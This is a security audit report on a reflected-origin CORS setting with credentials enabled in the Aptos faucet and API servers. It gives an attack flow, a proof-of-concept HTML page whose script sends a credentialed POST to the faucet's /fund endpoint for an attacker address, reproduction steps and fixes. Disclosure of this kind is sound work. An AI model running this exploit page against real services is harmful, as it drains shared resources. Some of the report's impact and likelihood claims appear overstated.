# Audit Report

## Title
CORS Misconfiguration in Faucet HTTP Server Allows Cross-Origin Request Forgery

## Summary
The faucet HTTP server in `aptos-workspace-server` has a permissive CORS configuration that reflects any origin without validation while allowing credentials. This enables attackers to host malicious websites that can make authenticated cross-origin requests to the faucet endpoints, potentially bypassing rate limits and draining faucet funds.

## Finding Description

The `start_faucet()` function creates a faucet service using `RunConfig::build_for_cli()` [1](#0-0) , which initializes the faucet with minimal security checks.

The underlying HTTP server's CORS configuration is critically misconfigured [2](#0-1) . The configuration:

1. **Does not specify allowed origins** - No call to `.allow_origin()` means the Poem CORS middleware defaults to reflecting any incoming `Origin` header back in the `Access-Control-Allow-Origin` response header
2. **Enables credentials** - `.allow_credentials(true)` allows browsers to send cookies and authentication headers with cross-origin requests
3. **Allows POST requests** - `.allow_methods(vec![Method::GET, Method::POST])` permits state-changing operations

This exact "echo any origin" behavior is confirmed by test cases in the main API server [3](#0-2) , which demonstrates that when a request includes `origin: test`, the response header `access-control-allow-origin: test` is returned, confirming the reflection pattern.

The identical CORS misconfiguration also exists in the main API server runtime [4](#0-3) , showing this is a systemic pattern across Aptos HTTP services.

### Attack Flow

1. Attacker creates a malicious website at `https://evil.com`
2. Victim visits the malicious website
3. JavaScript on the page makes AJAX requests to the faucet's `/fund` or `/mint` endpoints
4. The browser includes the `Origin: https://evil.com` header
5. The faucet's CORS middleware reflects this origin in `Access-Control-Allow-Origin: https://evil.com`
6. The browser allows the malicious JavaScript to read the response
7. Attacker can:
   - Request funds to attacker-controlled addresses
   - Use victim's IP address to bypass rate limits
   - Make multiple requests across different victim sessions
   - Perform CSRF-style attacks on any faucet endpoints

## Impact Explanation

**Severity: Medium** (aligns with the $10,000 tier per Aptos Bug Bounty)

This vulnerability enables **limited funds loss or manipulation**:

- **Fund Drainage**: Attackers can programmatically request faucet funds to their addresses by exploiting victim browsers, potentially exhausting faucet reserves faster than intended
- **Rate Limit Bypass**: By distributing requests across multiple victim IPs, attackers circumvent per-IP rate limiting mechanisms
- **Service Abuse**: The faucet service can be abused at scale without direct API access

The impact is limited to Medium (not Critical/High) because:
- Faucets typically have per-request amount limits
- Faucets serve test/dev networks, not mainnet production funds
- Total drainable amount is bounded by faucet reserves
- No direct validator node compromise or consensus violation
- Does not affect blockchain state or mainnet assets

However, it breaks the **Access Control** invariant (#8) by allowing unauthorized cross-origin access to protected endpoints.

## Likelihood Explanation

**Likelihood: High**

This vulnerability is highly likely to be exploited because:

1. **Easy to exploit**: Requires only basic web development skills (HTML + JavaScript)
2. **No authentication bypass needed**: Exploits standard browser CORS mechanisms
3. **Wide attack surface**: Any user visiting a malicious website becomes an attack vector
4. **Profitable**: Attackers gain free testnet funds without direct API interaction
5. **Difficult to detect**: Requests appear to come from legitimate user IPs
6. **No setup cost**: Attacker only needs to host a webpage

The attack complexity is **low** - a simple HTML page with fetch/XMLHttpRequest is sufficient.

## Recommendation

**Fix: Restrict CORS to specific allowed origins**

The CORS configuration must explicitly whitelist allowed origins instead of reflecting arbitrary values. For a development faucet, this could be:

```rust
let cors = Cors::new()
    .allow_origin("http://localhost:3000")  // Local development
    .allow_origin("https://aptos.dev")      // Official frontend
    // Add other trusted origins as needed
    .allow_credentials(true)
    .allow_methods(vec![Method::GET, Method::POST]);
```

**Alternative: Disable credentials if origin restriction is not feasible**

If the faucet must accept requests from any origin, remove credential support:

```rust
let cors = Cors::new()
    .allow_origin("*")  // Explicit wildcard
    // .allow_credentials(true) <- REMOVE THIS
    .allow_methods(vec![Method::GET, Method::POST]);
```

However, this approach is less secure and should include other protections like CAPTCHA or API keys.

**Additional Mitigations:**
- Implement origin validation at the application layer
- Add CAPTCHA challenges for fund requests
- Enhance rate limiting with additional signals beyond IP
- Log and monitor for suspicious cross-origin request patterns
- Consider requiring API keys for programmatic access

This fix should be applied to both the faucet service [2](#0-1)  and the main API server [4](#0-3) .

## Proof of Concept

**Malicious Website HTML (`evil.html`):**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Faucet CORS Exploit PoC</title>
</head>
<body>
    <h1>Aptos Faucet CORS Bypass Demo</h1>
    <button onclick="exploitFaucet()">Request Funds</button>
    <pre id="output"></pre>

    <script>
        async function exploitFaucet() {
            const output = document.getElementById('output');
            const attackerAddress = "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef";
            
            // Faucet endpoint (adjust port as needed)
            const faucetUrl = "http://127.0.0.1:8081/fund";
            
            try {
                const response = await fetch(faucetUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    credentials: 'include',  // Send cookies
                    body: JSON.stringify({
                        address: attackerAddress,
                        amount: 100000000000  // Request maximum amount
                    })
                });
                
                const data = await response.json();
                output.textContent = `Success! Transaction: ${JSON.stringify(data, null, 2)}`;
                
                // Attacker can now repeat this multiple times
                // or across multiple victim browsers
            } catch (error) {
                output.textContent = `Error: ${error.message}`;
            }
        }
    </script>
</body>
</html>
```

**Steps to Reproduce:**

1. Start an Aptos local testnet with the faucet service running (default port 8081)
2. Host `evil.html` on any web server (e.g., `python3 -m http.server 8000`)
3. Visit `http://localhost:8000/evil.html` in a browser
4. Click "Request Funds" button
5. Observe successful cross-origin request to faucet
6. Check that funds were sent to the attacker's address
7. Verify that the browser's developer tools show the `access-control-allow-origin` header matching the evil site's origin

**Expected Result:** The request succeeds because the faucet's CORS policy reflects the `Origin: http://localhost:8000` header, allowing the malicious JavaScript to access the response.

**Verification:** Check response headers using browser DevTools - you'll see `access-control-allow-origin: http://localhost:8000` confirming the vulnerability.

### Citations

**File:** aptos-move/aptos-workspace-server/src/services/faucet.rs (L46-53)
```rust
        let faucet_run_config = RunConfig::build_for_cli(
            Url::parse(&format!("http://{}:{}", IP_LOCAL_HOST, api_port)).unwrap(),
            IP_LOCAL_HOST.to_string(),
            0,
            FunderKeyEnum::KeyFile(test_dir.join("mint.key")),
            false,
            None,
        );
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L175-180)
```rust
        let cors = Cors::new()
            // To allow browsers to use cookies (for cookie-based sticky
            // routing in the LB) we must enable this:
            // https://stackoverflow.com/a/24689738/3846032
            .allow_credentials(true)
            .allow_methods(vec![Method::GET, Method::POST]);
```

**File:** api/src/tests/index_test.rs (L59-74)
```rust
async fn test_cors() {
    let context = new_test_context(current_function_name!());
    let paths = ["/spec.yaml", "/spec", "/", "/transactions"];
    for path in paths {
        let req = warp::test::request()
            .header("origin", "test")
            .header("Access-Control-Request-Headers", "Content-Type")
            .header("Access-Control-Request-Method", "POST")
            .method("OPTIONS")
            .path(&format!("/v1{}", path));
        let resp = context.reply(req).await;
        assert_eq!(resp.status(), 200);
        let cors_header = resp.headers().get("access-control-allow-origin").unwrap();
        assert_eq!(cors_header, "test");
    }
}
```

**File:** api/src/runtime.rs (L230-235)
```rust
        let cors = Cors::new()
            // To allow browsers to use cookies (for cookie-based sticky
            // routing in the LB) we must enable this:
            // https://stackoverflow.com/a/24689738/3846032
            .allow_credentials(true)
            .allow_methods(vec![Method::GET, Method::POST]);
```
